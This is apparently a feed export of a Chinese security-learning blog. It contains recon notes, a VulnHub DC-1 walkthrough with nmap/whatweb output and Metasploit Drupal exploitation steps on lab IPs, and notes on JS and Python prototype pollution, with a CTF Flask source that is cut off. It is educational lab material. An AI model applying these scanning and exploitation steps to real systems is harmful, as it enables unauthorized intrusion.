    <content type="html"><![CDATA[<h1 id="信息打点"><a href="#信息打点" class="headerlink" title="信息打点"></a>信息打点</h1><p>1、打点-Web架构-语言&amp;中间件&amp;数据库&amp;系统等<br>2、打点-Web源码-CMS开源&amp;闭源售卖&amp;自主研发等<br>3、打点-Web源码获取-泄露安全&amp;资源监控&amp;其他等<br>4、打点-Web域名-子域名&amp;相似域名&amp;反查域名&amp;旁注等</p><p>区分windows 和Linux 可以用 大写小写来区分</p><p>windows上对文件的大小写不区分 </p><p>也可以通过ping网站来判断 一般 window de ttl&gt;100 Linux&lt;100</p><p>数据判断 搭建组合 端口扫描</p><p>#知识点：<br>1、CMS指纹识别源码获取方式<br>2、习惯&amp;配置&amp;特性等获取方式<br>3、托管资产平台资源搜索监控</p><p> 源码泄露</p><p>cms识别 云溪</p><p>管理员习惯不好 备份泄露</p><p>配置不当 git 泄露 |发布代码时候 没有将.git删除 直接同步上传道服务器其上</p><p> svn泄露 ds_Store泄露|同步发布道服务器上</p><p>php特性 composer.json 泄露 配置性说明性 文件 获得相关信息  </p><p>下载配合 WEB-INF泄露 必须要下载文件的漏洞 </p><p>GITHUB泄露 语法搜索&amp;管检测搜索</p><p>获取网络信息-服务厂商&amp;网络架构<br>获取服务信息-应用协议&amp;内网资产<br>获取阻碍信息-CDN&amp;WAF&amp;负载&amp;防火墙</p><p>内网资产查询  </p><p>旁注：同服务器下面的不同WEB应用查询技术<br>C段：同网段下面的不同服务器IP下的WEB应用查询技术</p><p>旁注查询 </p><p>c段查询 ip反查域名</p><p>cdn 查询 超级ping 去测试全国对其访问的速度来检测网站开通了cdn</p><p>网站waf  区分</p><p>超级ping：CDN服务识别<br>Masscan：端口扫描，应用协议<br>Wafw00f：Web应用防护防火墙识别<br>Nmap：端口扫描，应用协议，防火墙识别<br>lbd：负载均衡，广域网负载均衡，应用层负载均衡</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;信息打点&quot;&gt;&lt;a href=&quot;#信息打点&quot; class=&quot;headerlink&quot; title=&quot;信息打点&quot;&gt;&lt;/a&gt;信息打点&lt;/h1&gt;&lt;p&gt;1、打点-Web架构-语言&amp;amp;中间件&amp;amp;数据库&amp;amp;系统等&lt;br&gt;2、打点-Web源码-CMS开源&amp;amp;</summary>
      
    
    
    
    
    <category term="dixodisec" scheme="https://gu0f3n.github.io/tags/dixodisec/"/>
    
  </entry>
  
  <entry>
    <title>跟着小迪第一天</title>
    <link href="https://gu0f3n.github.io/2025/02/28/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%AC%AC%E4%B8%80%E5%A4%A9/"/>
    <id>https://gu0f3n.github.io/2025/02/28/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%AC%AC%E4%B8%80%E5%A4%A9/</id>
    <published>2025-02-28T12:17:15.000Z</published>
    <updated>2025-03-14T11:20:03.845Z</updated>
    
    <content type="html"><![CDATA[<p>跟着小迪学习第一天</p><p>名词解释</p><p>POC：全称’ProofofConcept’，中文’概念验证’，常指一段漏洞证明的代码。<br>EXP：全称’Exploit’，中文利用，指利用系统漏洞进行攻击的动作。<br>Payload：中文有效载荷，指成功exploit之后，真正在目标系统执行的代码或指令。<br>Shellcode：简单翻译’shell代码’，是Payload的一种，由于其建立正向&#x2F;反向shell而得名。</p><p>网站搭建前置知识</p><p>域名 子域名 DNS http&#x2F;https 证书</p><p>web应用框架架构 </p><p>理解不同web应用组成校色功能框架 </p><p>开发语言，程序源码，中间件容器，数据库类型，服务器操作系统，第三方软件等<br>开发语言：asp,php,aspx,jsp,java,python,ruby,go,html,javascript等<br>程序源码：根据开发语言分类；应用类型分类；开源CMS分类；开发框架分类等<br>中间件容器：IIS,Apache,Nginx,Tomcat,Weblogic,Jboos,glasshfish等|支撑网站运行，各有不同的功能<br>数据库类型: Access,Mysql,Mssql,Oracle,db2,Sybase,Redis,MongoDB等|存储数据，根据不同需求，应用不同的数据库类型<br>服务器操作系统：Windows系列，Linux系列，Mac系列等|<br>第三方软件：phpmyadmin,vs-ftpd,VNC,ELK,Openssh等 </p><p>#WEB应用安全漏洞分类（程序源码）<br>SQL注入，文件安全，RCE执行，XSS跨站，CSRF&#x2F;SSRF&#x2F;CRLF，<br>反序列化，逻辑越权，未授权访问，XXE&#x2F;XML，弱口令安全等</p><p>web请求的过程 <a href="https://www.cnblogs.com/51benpao/p/12984951.html">https://www.cnblogs.com/51benpao/p/12984951.html</a> </p><p>浏览器输入域名-&gt;浏览器dns解析到ip地址-&gt;服务器和客户机建立tcp(三次握手)连接-&gt;浏览器通过http协议发送请求数据包-&gt;可能某些服务会做重定向来负载均衡-&gt;浏览器跟踪重定向地址重新开始连接过程-&gt;服务器处理请求-&gt;服务器发出html响应-&gt;释放tcp连接-&gt;浏览器显示页面（此时还没有完全接受到html全部的文档）-&gt;发送剩余的内容</p><p>web请求数据包<a href="https://www.cnblogs.com/rayray/p/3729533.html">https://www.cnblogs.com/rayray/p/3729533.html</a></p><p>学会不同对象采用不同抓包封包抓取技术分析</p><p>基于网络接口抓包-网络接口<br>基于程序进程抓包-程序进程<br>基于数据协议抓包-HTTP&#x2F;S&amp;TCP&amp;UDP<br>基于应用对象抓包-APP&amp;小程序&amp;PCUI<br>基于系统使用抓包-模拟器&amp;WIN&amp;LINUX</p><p>存储密码加密-Web&amp;数据库&amp;系统<br>传输数据编码-各类组合传输参数值<br>代码特性加密-JS&amp;PHP&amp;NET&amp;JAVA<br>数据显示编码-字符串数据显示编码</p><p> 详细点：<br>密码存储加密：<br>MD5 SHA1 NTLM AES DES RC4<br>MD5值是32或16位位由数”0-9”和字母”a-f”所组成的字符串<br>SHA1这种加密的密文特征跟MD5差不多，只不过位数是40<br>NTLM这种加密是Windows的哈希密码，标准通讯安全协议<br>AES，DES，RC4这些都是非对称性加密算法，引I入密钥，密文特征与Base64类似<br>应用场景：各类应用密文，自定义算法，代码分析，CTF安全比赛等</p><p>NTLM介绍 <a href="https://blog.csdn.net/qq_62169455/article/details/132617592">https://blog.csdn.net/qq_62169455/article/details/132617592</a></p><p>后端代码加密：<br>PHP .NET JAVA<br>PHP：乱码，头部有信息<br>.NET：DLL封装代码文件<br>JAVA:JAR&amp;CLASS文件<br>举例：Zend ILSpy IDEA<br>应用场景：版权代码加密，开发特性，CTE比赛等</p><p>编译和反编译 <a href="https://zhuanlan.zhihu.com/p/4766970">https://zhuanlan.zhihu.com/p/4766970</a> <a href="https://blog.csdn.net/weixin_44943389/article/details/132507440">https://blog.csdn.net/weixin_44943389/article/details/132507440</a></p><p>#知识点：<br>1、资产架构-端口目录插件接口多站点多应用<br>2、番外安全-域名c服务器本身服务厂商管理人员<br>3、考虑阻碍-站库分离&amp;CDN&amp;WAF&amp;负载均衡&amp;主机防护<br>详细点：<br>1、前置条件-购买使用-云服务器域名等<br>2、架构搭建-目录c端口子域c插件s应用等<br>3、安全部署-WAE防火墙&amp;主机防护&amp;HIDS等<br>4、性能优化-负载均衡&amp;CDN加速cOSS云存储等</p><p><strong>资产架构</strong>：<br>WEB单个源码指向安全 |<br>WEB多个目录源码安全 |可能会有多个程序，就有多个漏洞 扫描软7bscan<br>WEB多个端口源码安全 | nmap<br>服务器架设多个站点安全|<br>架设第三方插件接口安全|<br>服务器架设多个应用安全|<br>#番外安全：<br>基于域名解析安全 |<br>基于服务器本身安全<br>基于服务商信息安全<br>基于管理个人的安全<br>#考虑阻碍：<br>阻碍-站库分离|<br>阻碍-CDN加速服务|<a href="https://zhuanlan.zhihu.com/p/616462418">https://zhuanlan.zhihu.com/p/616462418</a><br>阻碍-负载均衡服务|<a href="https://www.sangfor.com.cn/knowledge/load-balancing|%E5%8F%AF%E8%83%BD%E8%8E%B7%E5%BE%97%E7%9A%84%E6%98%AF%E5%A4%87%E7%94%A8%E6%9C%BA%E7%9A%84%E6%9D%83%E9%99%90">https://www.sangfor.com.cn/knowledge/load-balancing|可能获得的是备用机的权限</a><br>阻碍-WAF应用防火墙|</p><p>阻碍-主机防护防火墙|服务器杀毒软件</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;跟着小迪学习第一天&lt;/p&gt;
&lt;p&gt;名词解释&lt;/p&gt;
&lt;p&gt;POC：全称’ProofofConcept’，中文’概念验证’，常指一段漏洞证明的代码。&lt;br&gt;EXP：全称’Exploit’，中文利用，指利用系统漏洞进行攻击的动作。&lt;br&gt;Payload：中文有效载荷，指成功ex</summary>
      
    
    
    
    
    <category term="xiaodisec" scheme="https://gu0f3n.github.io/tags/xiaodisec/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub DC-1</title>
    <link href="https://gu0f3n.github.io/2025/02/16/vulnhub-DC-1/"/>
    <id>https://gu0f3n.github.io/2025/02/16/vulnhub-DC-1/</id>
    <published>2025-02-16T09:28:03.000Z</published>
    <updated>2025-03-05T05:28:18.717Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:e7:49:b2, IPv4: 192.168.205.128</span><br><span class="line">WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied</span><br><span class="line">WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.205.1   00:50:56:c0:00:01       (Unknown)</span><br><span class="line">192.168.205.2   00:50:56:f7:4f:9c       (Unknown)</span><br><span class="line">192.168.205.129 00:0c:29:04:0c:de       (Unknown)</span><br><span class="line">192.168.205.254 00:50:56:e2:1c:01       (Unknown)</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned in 1.874 seconds (136.61 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure><p>发现192.168.205.129 是我们的靶机ip 开始信息搜集</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root㉿kali)-[/home/kali]</span><br><span class="line">└─# nmap -sS -sV -A -T4 -p- 192.168.205.129</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-16 04:26 EST</span><br><span class="line">Nmap scan report for 192.168.205.129</span><br><span class="line">Host is up (0.00043s latency).</span><br><span class="line">Not shown: 65531 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)</span><br><span class="line">|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)</span><br><span class="line">|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.2.22 ((Debian))</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Debian)</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">|_http-title: Welcome to Drupal Site | Drupal Site</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          44174/udp6  status</span><br><span class="line">|   100024  1          46616/tcp   status</span><br><span class="line">|   100024  1          46812/udp   status</span><br><span class="line">|_  100024  1          46918/tcp6  status</span><br><span class="line">46616/tcp open  status  1 (RPC #100024)</span><br><span class="line">MAC Address: 00:0C:29:04:0C:DE (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3</span><br><span class="line">OS details: Linux 3.2 - 3.16</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.43 ms 192.168.205.129</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 20.30 seconds</span><br></pre></td></tr></table></figure><p>得到22 80 111 三个端口</p><p>22是ssh 80是http服务 </p><p>首先进入web页面看一看有什么</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/20250216173216.png"></p><p>一个登录页面 拿一下网站的基本信息</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# whatweb -v 192.168.205.129</span><br><span class="line">WhatWeb report for http://192.168.205.129</span><br><span class="line">Status    : 200 OK</span><br><span class="line">Title     : Welcome to Drupal Site | Drupal Site</span><br><span class="line">IP        : 192.168.205.129</span><br><span class="line">Country   : RESERVED, ZZ</span><br><span class="line"></span><br><span class="line">Summary   : Apache[2.2.22], Content-Language[en], Drupal, HTTPServer[Debian Linux][Apache/2.2.22 (Debian)], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PasswordField[pass], PHP[5.4.45-0+deb7u14], Script[text/javascript], UncommonHeaders[x-generator], X-Powered-By[PHP/5.4.45-0+deb7u14]   </span><br><span class="line"></span><br><span class="line">Detected Plugins:</span><br><span class="line">[ Apache ]</span><br><span class="line">        The Apache HTTP Server Project is an effort to develop and </span><br><span class="line">        maintain an open-source HTTP server for modern operating </span><br><span class="line">        systems including UNIX and Windows NT. The goal of this </span><br><span class="line">        project is to provide a secure, efficient and extensible </span><br><span class="line">        server that provides HTTP services in sync with the current </span><br><span class="line">        HTTP standards. </span><br><span class="line"></span><br><span class="line">        Version      : 2.2.22 (from HTTP Server Header)</span><br><span class="line">        Google Dorks: (3)</span><br><span class="line">        Website     : http://httpd.apache.org/</span><br><span class="line"></span><br><span class="line">[ Content-Language ]</span><br><span class="line">        Detect the content-language setting from the HTTP header. </span><br><span class="line"></span><br><span class="line">        String       : en</span><br><span class="line"></span><br><span class="line">[ Drupal ]</span><br><span class="line">        Drupal is an opensource CMS written in PHP. </span><br><span class="line"></span><br><span class="line">        Aggressive function available (check plugin file or details).</span><br><span class="line">        Google Dorks: (1)</span><br><span class="line">        Website     : http://www.drupal.org</span><br><span class="line"></span><br><span class="line">[ HTTPServer ]</span><br><span class="line">        HTTP server header string. This plugin also attempts to </span><br><span class="line">        identify the operating system from the server header. </span><br><span class="line"></span><br><span class="line">        OS           : Debian Linux</span><br><span class="line">        String       : Apache/2.2.22 (Debian) (from server string)</span><br><span class="line"></span><br><span class="line">[ JQuery ]</span><br><span class="line">        A fast, concise, JavaScript that simplifies how to traverse </span><br><span class="line">        HTML documents, handle events, perform animations, and add </span><br><span class="line">        AJAX. </span><br><span class="line"></span><br><span class="line">        Website     : http://jquery.com/</span><br><span class="line"></span><br><span class="line">[ MetaGenerator ]</span><br><span class="line">        This plugin identifies meta generator tags and extracts its </span><br><span class="line">        value. </span><br><span class="line"></span><br><span class="line">        String       : Drupal 7 (http://drupal.org)</span><br><span class="line"></span><br><span class="line">[ PHP ]</span><br><span class="line">        PHP is a widely-used general-purpose scripting language </span><br><span class="line">        that is especially suited for Web development and can be </span><br><span class="line">        embedded into HTML. This plugin identifies PHP errors, </span><br><span class="line">        modules and versions and extracts the local file path and </span><br><span class="line">        username if present. </span><br><span class="line"></span><br><span class="line">        Version      : 5.4.45-0+deb7u14</span><br><span class="line">        Google Dorks: (2)</span><br><span class="line">        Website     : http://www.php.net/</span><br><span class="line"></span><br><span class="line">[ PasswordField ]</span><br><span class="line">        find password fields </span><br><span class="line"></span><br><span class="line">        String       : pass (from field name)</span><br><span class="line"></span><br><span class="line">[ Script ]</span><br><span class="line">        This plugin detects instances of script HTML elements and </span><br><span class="line">        returns the script language/type. </span><br><span class="line"></span><br><span class="line">        String       : text/javascript</span><br><span class="line"></span><br><span class="line">[ UncommonHeaders ]</span><br><span class="line">        Uncommon HTTP server headers. The blacklist includes all </span><br><span class="line">        the standard headers and many non standard but common ones. </span><br><span class="line">        Interesting but fairly common headers should have their own </span><br><span class="line">        plugins, eg. x-powered-by, server and x-aspnet-version. </span><br><span class="line">        Info about headers can be found at www.http-stats.com </span><br><span class="line"></span><br><span class="line">        String       : x-generator (from headers)</span><br><span class="line"></span><br><span class="line">[ X-Powered-By ]</span><br><span class="line">        X-Powered-By HTTP header </span><br><span class="line"></span><br><span class="line">        String       : PHP/5.4.45-0+deb7u14 (from x-powered-by string)</span><br><span class="line"></span><br><span class="line">HTTP Headers:</span><br><span class="line">        HTTP/1.1 200 OK</span><br><span class="line">        Date: Sat, 15 Feb 2025 23:03:39 GMT</span><br><span class="line">        Server: Apache/2.2.22 (Debian)</span><br><span class="line">        X-Powered-By: PHP/5.4.45-0+deb7u14</span><br><span class="line">        Expires: Sun, 19 Nov 1978 05:00:00 GMT</span><br><span class="line">        Last-Modified: Sat, 15 Feb 2025 23:03:39 +0000</span><br><span class="line">        Cache-Control: no-cache, must-revalidate, post-check=0, pre-check=0</span><br><span class="line">        ETag: &quot;1739660619&quot;</span><br><span class="line">        Content-Language: en</span><br><span class="line">        X-Generator: Drupal 7 (http://drupal.org)</span><br><span class="line">        Vary: Accept-Encoding</span><br><span class="line">        Content-Encoding: gzip</span><br><span class="line">        Content-Length: 2276</span><br><span class="line">        Connection: close</span><br><span class="line">        Content-Type: text/html; charset=utf-8</span><br></pre></td></tr></table></figure><p>这里可以看到靶机的cms是Drupal</p><p>***启动Metersploit*****<em><strong>服务*</strong></em></p><p>搜寻drupal模块</p><p>使用序号一这个</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use 1</span><br><span class="line"></span><br><span class="line">set Rhost 192.168.29.131 *# s设置靶机ip*</span><br><span class="line"></span><br><span class="line">set lhost 192.168.29.128 *# 设置攻机ip*</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">run#</span><span class="language-bash">开始攻击</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;┌──(root㉿kali)-[/home/kali]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;</summary>
      
    
    
    
    <category term="vulnhub" scheme="https://gu0f3n.github.io/categories/vulnhub/"/>
    
    
    <category term="vulnhub" scheme="https://gu0f3n.github.io/tags/vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>js原型链污染初探</title>
    <link href="https://gu0f3n.github.io/2024/11/25/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%9D%E6%8E%A2/"/>
    <id>https://gu0f3n.github.io/2024/11/25/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%9D%E6%8E%A2/</id>
    <published>2024-11-25T02:36:10.000Z</published>
    <updated>2024-11-25T06:03:24.721Z</updated>
    
    <content type="html"><![CDATA[<p>Learn from:<a href="https://wiki.wgpsec.org/knowledge/ctf/js-prototype-chain-pollution.html">https://wiki.wgpsec.org/knowledge/ctf/js-prototype-chain-pollution.html</a></p><p>先放一张图</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1732502203084.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">js 是由对象组成的，对象与对象之间存在着继承关系</span><br><span class="line"></span><br><span class="line">每个对象都有一个指向它的原型的内部链接，而这个原型对象又有他自己的原型，直到 null 为止</span><br><span class="line"></span><br><span class="line">整体看来就是多个对象层层继承，实例对象的原型链接形成了一条链，也就是 js 的原型链</span><br><span class="line"></span><br><span class="line">在 js 中每个函数都有一个 prototype 属性，而每个对象中也有一个 **proto** 属性用来指向实例对象的原型</span><br><span class="line"></span><br><span class="line">而每个原型也都有一个 constructor 属性执行相关联的构造函数，我们就是通过构造函数生成实例化的对象</span><br></pre></td></tr></table></figure><p>由于对象之间存在继承关系，所以当我们要使用或者输出一个变量就会通过原型链向上搜索，当上层没有就会再向上上层搜索，直到指向 null，若此时还未找到就会返回 undefined</p><p>这幅图的原型链是 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat-&gt;Cat.protype-&gt;Object.prototype-&gt;null</span><br></pre></td></tr></table></figure><p><strong>原型链污染通常出现在对象</strong>，<strong>数组的键名或者属性名可控</strong>，同时是赋值语句的情况下 ( 通常使用 json 传值 )</p><p>Learn form:<a href="https://pazuris.cn/2023/07/26/NodeJs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">https://pazuris.cn/2023/07/26/NodeJs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a></p><p>师傅讲的很详细</p><p><strong>prototype和__proto__的区别</strong></p><p>在 JavaScript 中，每个对象都有一个 <code>__proto__</code> 属性，它指向该对象的原型。原型是一个对象，也可以有自己的原型，这样就形成了一个原型链。同时，每个函数也有一个 <code>prototype</code> 属性，它是一个对象，当该函数作为构造函数创建实例时，实例对象的 <code>__proto__</code> 属性会指向该构造函数的 <code>prototype</code> 属性，这样就可以实现属性和方法的继承。</p><p>区别在于：</p><ul><li><code>prototype</code>属性是函数所独有的，而<code>__proro__</code>属性是每个对象都有的（再强调一次，函数也是js对象）</li><li><code>prototype</code> 属性指向一个对象，它是用来存储属性和方法，这些属性和方法可以被该函数的实例对象所继承。而 <code>__proto__</code> 属性指向该对象的原型，它是用来实现对象之间的继承。简单来说就是<code>functionName.prototype===varName.__proto__</code>，都可以访问到对象的原型。</li></ul><h2 id="nodejs原型链污染"><a href="#nodejs原型链污染" class="headerlink" title="nodejs原型链污染"></a>nodejs原型链污染</h2><p><strong>概念</strong></p><p>一句话概括原型链污染：如果修改了一个对象的原型，那么会影响所有来自于这个原型的对象，这就是原型链污染。</p><p>原型链污染通常出现在对象，数组的键名或者属性名可控，同时是赋值语句的情况下 （简单来说就是键名和键值都可控情况下），将键名设置为<code>__proto__</code>就可以利用赋值语句修改原型对象，进而实现原型链污染，常见的危险函数有merge和clone。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Learn from:&lt;a href=&quot;https://wiki.wgpsec.org/knowledge/ctf/js-prototype-chain-pollution.html&quot;&gt;https://wiki.wgpsec.org/knowledge/ctf/js-pro</summary>
      
    
    
    
    <category term="pollute" scheme="https://gu0f3n.github.io/categories/pollute/"/>
    
    
    <category term="nodejs" scheme="https://gu0f3n.github.io/tags/nodejs/"/>
    
  </entry>
  
  <entry>
    <title>Python原型链污染</title>
    <link href="https://gu0f3n.github.io/2024/11/22/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <id>https://gu0f3n.github.io/2024/11/22/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</id>
    <published>2024-11-22T07:12:18.000Z</published>
    <updated>2024-11-25T04:52:55.992Z</updated>
    
    <content type="html"><![CDATA[<p>leran from :<a href="https://pazuris.cn/2023/07/27/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">https://pazuris.cn/2023/07/27/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a></p><h1 id="Python原型链污染"><a href="#Python原型链污染" class="headerlink" title="Python原型链污染"></a>Python原型链污染</h1><p>这个知识点应用的范围比较小，仅当题目中出现<code>utils</code>的<code>merge</code>或<code>Pydash</code>模块中的<code>set</code>和<code>set_with</code>函数才会用上</p><p>首先经典回顾一下python的类与继承：</p><ul><li>在Python中，定义类是通过<code>class</code>关键字，<code>class</code>后面紧接着是类名，紧接着是<code>(object)</code>，表示该类是从哪个类继承下来的，所有类的本源都是object类</li><li>可以自由地给一个实例变量绑定属性，像js</li><li>由于类可以起到模板的作用，因此，可以在创建实例的时候，把一些我们认为必须绑定的属性强制填写进去。通过定义一个特殊的<code>__init__</code>方法，在创建实例的时候，就把类内置的属性绑上</li><li>注意到<code>__init__</code>方法的第一个参数永远是<code>self</code>，表示创建的实例本身，因此，在<code>__init__</code>方法内部，就可以把各种属性绑定到<code>self</code>，因为<code>self</code>就指向创建的实例本身。</li><li>当我们定义了一个类属性后，这个属性虽然归类所有，但类的所有实例都可以访问到</li><li>判断一个变量是否是某个类型可以用<code>isinstance()</code>判断。</li></ul><p>在Python中每个对象都有一个原型，原型上定义了对象可以访问的属性和方法。当对象访问属性或方法时，会先在自身查找，如果找不到就会去原型链上的上级对象中查找，原型链污染攻击的思路是通过修改对象原型链中的属性，使得程序在访问属性或方法时得到不符合预期的结果。</p><h2 id="DASCTF-2023-0X401七月暑期挑战赛-EzFlask"><a href="#DASCTF-2023-0X401七月暑期挑战赛-EzFlask" class="headerlink" title="[DASCTF 2023 &amp; 0X401七月暑期挑战赛]EzFlask"></a>[DASCTF 2023 &amp; 0X401七月暑期挑战赛]EzFlask</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)<span class="comment">#用于创建一个 Flask 应用实例</span></span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())<span class="comment">#设置 Flask 应用的密钥</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment">#遍历 src，递归合并数据到 dst，支持字典合并和对象属性动态更新。</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> <span class="variable language_">self</span>.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span><span class="comment">#@app.route 是一个装饰器</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:<span class="comment">#检查请求中是否有数据</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#使用 try...except 捕获所有可能的异常，确保程序不会因为意外错误而崩溃</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):<span class="comment">#假定是一个自定义的函数，用于验证请求数据的合法性</span></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)<span class="comment">#将请求中的原始数据（字节流）解析为 